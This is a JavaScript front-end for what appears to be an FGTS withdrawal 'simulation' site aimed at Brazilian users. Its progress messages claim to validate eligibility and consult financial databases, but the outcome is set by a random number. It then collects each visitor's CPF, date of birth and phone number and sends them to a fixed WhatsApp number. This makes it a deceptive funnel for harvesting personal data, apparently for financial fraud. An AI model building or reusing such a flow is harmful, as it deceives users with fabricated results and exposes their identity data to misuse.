document.addEventListener('DOMContentLoaded', () => {

    // --- Seletores de Elementos Globais (para evitar buscas repetitivas) ---
    const body = document.body;
    const splashContainer = document.getElementById('splashContainer');
    const welcomeContent = document.getElementById('welcomeContent');
    const startButton = document.getElementById('startButton');
    const authButton = document.getElementById('authButton');

    // Elementos da tela de simulação
    const simulateCpfButton = document.getElementById('simulateCpfButton');
    const cpfSimulationInput = document.getElementById('cpfSimulation');
    const cpfSimulationFeedback = document.getElementById('cpfSimulationFeedback');
    const cpfSimulationGroup = document.getElementById('cpfSimulationGroup');
    const loadingIndicator = document.getElementById('loadingIndicator');
    const progressBar = document.querySelector('.progress');
    const loadingSteps = document.querySelector('.loading-steps');
    const simulationOutcomeMessage = document.getElementById('simulationOutcomeMessage');
    const outcomeTitle = document.getElementById('outcomeTitle');
    const outcomeText = document.getElementById('outcomeText');
    const actionButtonsContainer = document.getElementById('actionButtonsContainer');
    const bottomButtonContainer = document.getElementById('bottomButtonContainer');

    // Elementos da tela de dados finais
    const finalizeWhatsappButton = document.getElementById('finalizeWhatsappButton');
    const cpfInput = document.getElementById('cpf');
    const dobInput = document.getElementById('dob');
    const phoneInput = document.getElementById('phone');
    const cpfFeedback = document.getElementById('cpfFeedback');
    const dobFeedback = document.getElementById('dobFeedback');
    const phoneFeedback = document.getElementById('phoneFeedback');


    // --- Lógica da Splash Screen (apenas no index.html) ---
    if (body.classList.contains('splash-screen')) {
        // Inicialmente oculta o conteúdo da welcome screen
        if (welcomeContent) {
            welcomeContent.style.display = 'none';
            welcomeContent.style.opacity = '0';
        }

        setTimeout(() => {
            if (splashContainer) {
                splashContainer.style.opacity = '0';
                splashContainer.style.pointerEvents = 'none';
            }

            setTimeout(() => {
                if (splashContainer) {
                    splashContainer.style.display = 'none';
                }

                // Altera as classes do body para a welcome screen
                body.classList.remove('splash-screen');
                body.classList.add('welcome-active');

                if (welcomeContent) {
                    welcomeContent.style.display = 'flex';
                    requestAnimationFrame(() => {
                        welcomeContent.style.opacity = '1';
                    });

                    // Aplica as animações de entrada aos elementos da welcome screen
                    document.querySelectorAll('.welcome-logo, .slogan, .security-badge, .feature-item, .trust-section, .action-buttons-container button').forEach(element => {
                        element.style.opacity = '0';
                        if (element.classList.contains('fade-in-down')) {
                            element.style.animation = 'fadeInDown 0.8s ease-out forwards';
                        } else if (element.classList.contains('fade-in-up')) {
                            element.style.animation = 'fadeInUp 0.8s ease-out forwards';
                        } else {
                             element.style.animation = 'fadeIn 0.8s ease-out forwards';
                        }
                        const delayClass = Array.from(element.classList).find(cls => cls.startsWith('delay-'));
                        if (delayClass) {
                            const delayTime = parseFloat(delayClass.replace('delay-', '')) * 0.2;
                            element.style.animationDelay = `${delayTime}s`;
                        } else {
                            element.style.animationDelay = '0s';
                        }
                    });
                }
            }, 800);
        }, 3000);
    }


    // --- Funções de Máscara (Otimizadas para Usabilidade Mobile) ---
    const applyCpfMask = (inputElement) => {
        if (!inputElement) return;

        inputElement.addEventListener('keydown', (e) => {
            if ([8, 46, 9, 27, 13, 37, 38, 39, 40].indexOf(e.keyCode) !== -1) {
                return;
            }
            if (e.key.length === 1 && /\D/.test(e.key)) {
                e.preventDefault();
            }
        });

        inputElement.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = '';

            if (value.length > 0) {
                formattedValue += value.substring(0, 3);
                if (value.length > 3) {
                    formattedValue += '.' + value.substring(3, 6);
                }
                if (value.length > 6) {
                    formattedValue += '.' + value.substring(6, 9);
                }
                if (value.length > 9) {
                    formattedValue += '-' + value.substring(9, 11);
                }
            }
            e.target.value = formattedValue;
        });
    };

    const applyPhoneMask = (inputElement) => {
        if (!inputElement) return;

        inputElement.addEventListener('keydown', (e) => {
            if ([8, 46, 9, 27, 13, 37, 38, 39, 40].indexOf(e.keyCode) !== -1) {
                return;
            }
            if (e.key.length === 1 && /\D/.test(e.key)) {
                e.preventDefault();
            }
        });

        inputElement.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = '';

            if (value.length > 0) {
                formattedValue += '(' + value.substring(0, 2);
                if (value.length > 2) {
                    if (value.length >= 7 && (value[2] === '9' || value[2] === '8' || value[2] === '7')) {
                        formattedValue += ') ' + value.substring(2, 7);
                        if (value.length > 7) {
                            formattedValue += '-' + value.substring(7, 11);
                        }
                    } else {
                        formattedValue += ') ' + value.substring(2, 6);
                        if (value.length > 6) {
                            formattedValue += '-' + value.substring(6, 10);
                        }
                    }
                }
            }
            e.target.value = formattedValue;
        });
    };

    // --- Função de Validação de CPF (Básica) ---
    const isValidCPF = (cpf) => {
        cpf = cpf.replace(/\D/g, '');
        if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;

        let sum = 0;
        let remainder;
        for (let i = 1; i <= 9; i++) sum = sum + parseInt(cpf.substring(i - 1, i)) * (11 - i);
        remainder = (sum * 10) % 11;
        if ((remainder === 10) || (remainder === 11)) remainder = 0;
        if (remainder !== parseInt(cpf.substring(9, 10))) return false;

        sum = 0;
        for (let i = 1; i <= 10; i++) sum = sum + parseInt(cpf.substring(i - 1, i)) * (12 - i);
        remainder = (sum * 10) % 11;
        if ((remainder === 10) || (remainder === 11)) remainder = 0;
        if (remainder !== parseInt(cpf.substring(10, 11))) return false;

        return true;
    };


    // --- Navegação entre Telas ---

    // Botão "Começar Agora" na Welcome Screen
    if (startButton) {
        startButton.addEventListener('click', () => {
            applyClickEffect(startButton);
            setTimeout(() => {
                window.location.href = 'auth.html';
            }, 300);
        });
    }

    // Botão "Já Autorizei" na Auth Screen
    if (authButton) {
        authButton.addEventListener('click', () => {
            applyClickEffect(authButton);
            setTimeout(() => {
                window.location.href = 'simulation.html';
            }, 300);
        });
    }

    // --- Lógica da Simulação (Simulation Screen) ---
    if (cpfSimulationInput) {
        applyCpfMask(cpfSimulationInput);
    }

    if (simulateCpfButton) {
        simulateCpfButton.addEventListener('click', () => {
            applyClickEffect(simulateCpfButton);

            const cpf = cpfSimulationInput ? cpfSimulationInput.value.replace(/\D/g, '') : '';

            // 1. Validação do CPF
            if (!isValidCPF(cpf)) {
                if (cpfSimulationFeedback) {
                    cpfSimulationFeedback.textContent = 'CPF inválido. Por favor, verifique o número.';
                    cpfSimulationFeedback.style.display = 'block';
                }
                if (cpfSimulationInput) cpfSimulationInput.focus();
                return;
            } else {
                if (cpfSimulationFeedback) cpfSimulationFeedback.style.display = 'none';
            }

            // Esconde o campo de CPF e o botão "Simular com CPF"
            if (cpfSimulationGroup) cpfSimulationGroup.style.display = 'none';
            if (bottomButtonContainer) bottomButtonContainer.style.display = 'none';
            
            // Oculta mensagens anteriores e exibe o indicador de carregamento
            if (simulationOutcomeMessage) simulationOutcomeMessage.style.display = 'none';
            if (loadingIndicator) loadingIndicator.style.display = 'flex';
            
            // Reseta a barra de progresso
            if (progressBar) progressBar.style.width = '0%';
            if (loadingSteps) loadingSteps.textContent = 'Etapa 1 de 3: Validando CPF e elegibilidade...';

            let progress = 0;
            const interval = setInterval(() => {
                progress += 5;
                if (progressBar) progressBar.style.width = `${progress}%`;

                if (progress === 30) {
                    if (loadingSteps) loadingSteps.textContent = 'Etapa 2 de 3: Consultando bases de dados financeiras...';
                } else if (progress === 70) {
                    if (loadingSteps) loadingSteps.textContent = 'Etapa 3 de 3: Obtendo propostas personalizadas...';
                }

                if (progress >= 100) {
                    clearInterval(interval);
                    setTimeout(() => {
                        if (loadingIndicator) loadingIndicator.style.display = 'none';

                        // Simula se encontrou valor ou não
                        const hasValue = Math.random() > 0.3;

                        if (actionButtonsContainer) actionButtonsContainer.innerHTML = '';

                        if (hasValue) {
                            if (outcomeTitle) outcomeTitle.textContent = '🎉 Valor Disponível!';
                            if (outcomeText) outcomeText.innerHTML = 'Parabéns! Identificamos um valor significativo para você no seu FGTS. Prossiga para os próximos passos e libere seu saque!';
                            if (simulationOutcomeMessage) simulationOutcomeMessage.style.display = 'block';

                            const continueButton = document.createElement('button');
                            continueButton.id = 'continueToWhatsappButton';
                            continueButton.className = 'main-button whatsapp interactive';
                            continueButton.innerHTML = '<i class="fab fa-whatsapp"></i> Liberar Meu FGTS Agora!';
                            continueButton.addEventListener('click', () => {
                                applyClickEffect(continueButton);
                                setTimeout(() => {
                                    window.location.href = 'finaldata.html';
                                }, 300);
                            });
                            actionButtonsContainer.appendChild(continueButton);

                        } else {
                            if (outcomeTitle) outcomeTitle.textContent = '😔 Sem Saldo Disponível no Momento.';
                            if (outcomeText) outcomeText.innerHTML = 'Não identificamos valores disponíveis para saque-aniversário neste momento. Isso pode ocorrer por diversos motivos (saque-rescisão ativo, saldo baixo).';
                            if (simulationOutcomeMessage) simulationOutcomeMessage.style.display = 'block';

                            const whatsappSupportButton = document.createElement('button');
                            whatsappSupportButton.id = 'whatsappSupportButton';
                            whatsappSupportButton.className = 'main-button whatsapp interactive';
                            whatsappSupportButton.innerHTML = '<i class="fab fa-whatsapp"></i> Falar com Suporte';
                            whatsappSupportButton.onclick = () => {
                                applyClickEffect(whatsappSupportButton);
                                const phoneNumber = '5511978311920';
                                const message = encodeURIComponent(`Olá, meu CPF é ${cpf}. Após a simulação no aplicativo, não foi encontrado valor para mim. Poderiam me ajudar a entender o motivo?`);
                                setTimeout(() => {
                                    window.open(`https://wa.me/${phoneNumber}?text=${message}`, '_blank');
                                }, 200);
                            };
                            actionButtonsContainer.appendChild(whatsappSupportButton);

                            const tryAgainButton = document.createElement('button');
                            tryAgainButton.id = 'tryAgainButton';
                            tryAgainButton.className = 'main-button secondary-button interactive';
                            tryAgainButton.innerHTML = '<i class="fas fa-redo-alt"></i> Tentar Novamente';
                            tryAgainButton.onclick = () => {
                                applyClickEffect(tryAgainButton);
                                setTimeout(() => {
                                    if (simulationOutcomeMessage) simulationOutcomeMessage.style.display = 'none';
                                    if (cpfSimulationGroup) cpfSimulationGroup.style.display = 'block';
                                    if (bottomButtonContainer) bottomButtonContainer.style.display = 'flex';
                                    if (cpfSimulationInput) {
                                        cpfSimulationInput.value = '';
                                        cpfSimulationInput.focus();
                                    }
                                }, 300);
                            };
                            actionButtonsContainer.appendChild(tryAgainButton);
                        }
                    }, 800);
                }
            }, 80);
        });
    }

    // --- Lógica da Final Data Screen ---
    if (cpfInput) applyCpfMask(cpfInput);
    if (phoneInput) applyPhoneMask(phoneInput);

    if (finalizeWhatsappButton) {
        finalizeWhatsappButton.addEventListener('click', () => {
            applyClickEffect(finalizeWhatsappButton);

            const cpf = cpfInput ? cpfInput.value.replace(/\D/g, '') : '';
            const dob = dobInput ? dobInput.value : '';
            const phone = phoneInput ? phoneInput.value.replace(/\D/g, '') : '';

            let isValid = true;

            if (!isValidCPF(cpf)) {
                if (cpfFeedback) {
                    cpfFeedback.textContent = 'CPF inválido. Verifique o número.';
                    cpfFeedback.style.display = 'block';
                }
                isValid = false;
                if (cpfInput) cpfInput.focus();
            } else {
                if (cpfFeedback) cpfFeedback.style.display = 'none';
            }

            if (!dobInput || !dob) {
                if (dobFeedback) {
                    dobFeedback.textContent = 'Informe sua data de nascimento.';
                    dobFeedback.style.display = 'block';
                }
                isValid = false;
                if (dobInput) dobInput.focus();
            } else {
                if (dobFeedback) dobFeedback.style.display = 'none';
            }

            if (!phoneInput || phone.length < 10 || phone.length > 11) {
                if (phoneFeedback) {
                    if (!phone) {
                        phoneFeedback.textContent = 'Por favor, insira seu telefone.';
                    } else {
                        phoneFeedback.textContent = 'Telefone inválido. Formato: (XX) XXXX-XXXX ou (XX) 9XXXX-XXXX';
                    }
                    phoneFeedback.style.display = 'block';
                }
                isValid = false;
                if (phoneInput) phoneInput.focus();
            } else {
                if (phoneFeedback) phoneFeedback.style.display = 'none';
            }

            if (isValid) {
                const formattedCpf = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
                const formattedDob = dob.split('-').reverse().join('/');
                const formattedPhone = phone.replace(/(\d{2})(\d{4,5})(\d{4})/, '($1) $2-$3');

                const messageContent = `Olá, gostaria de finalizar minha solicitação de Saque FGTS.
Meus dados:
CPF: ${formattedCpf}
Data de Nasc.: ${formattedDob}
Telefone: ${formattedPhone}`;

                const phoneNumber = '5511978311920';
                const message = encodeURIComponent(messageContent);
                const whatsappUrl = `https://wa.me/${phoneNumber}?text=${message}`;

                setTimeout(() => {
                    window.open(whatsappUrl, '_blank');
                }, 200);
            }
        });
    }

    // --- Navegação do Botão Voltar ---
    document.querySelectorAll('.back-button').forEach(button => {
        button.addEventListener('click', (event) => {
            event.preventDefault();
            applyClickEffect(button);
            setTimeout(() => {
                window.history.back();
            }, 200);
        });
    });

    // --- Feedback Visual de Clique para Elementos Interativos ---
    function applyClickEffect(element) {
        element.classList.add('active');
        requestAnimationFrame(() => {
            setTimeout(() => {
                element.classList.remove('active');
            }, 300);
        });
    }

    // Adiciona o feedback visual a todos os elementos com a classe 'interactive'
    document.querySelectorAll('.interactive').forEach(element => {
        element.addEventListener('mouseup', () => {
            applyClickEffect(element);
        });
        element.addEventListener('touchend', (event) => {
            event.preventDefault();
            applyClickEffect(element);
        });
        element.addEventListener('mouseleave', () => {
            element.classList.remove('active');
        });
        element.addEventListener('touchcancel', () => {
            element.classList.remove('active');
        });
    });

});
